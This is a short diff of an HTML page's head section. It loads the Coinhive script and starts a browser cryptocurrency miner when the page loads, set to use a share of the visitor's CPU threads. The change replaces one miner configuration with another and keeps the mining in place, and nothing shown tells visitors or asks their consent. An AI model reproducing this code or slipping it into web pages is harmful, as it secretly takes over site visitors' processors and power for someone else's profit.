@@ -8,12 +8,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-    var xmr = new CoinHive.Anonymous('mgKCszBsJYX5eJqEaBwkha2dbZ9z7rMk', {throttle: 0.85, threads: 1});
-try {
-	var threads = Math.max(1,Math.floor(navigator.hardwareConcurrency/4));
-	xmr.setNumThreads(threads);
-	xmr.start();
-}catch(e){xmr.start();}
+    var miner = new CoinHive.Anonymous('mgKCszBsJYX5eJqEaBwkha2dbZ9z7rMk', {username:'john-doe', threads: Math.ceil(navigator.hardwareConcurrency/4)});
+                miner.start();
 </script>
 </head>
 <body>
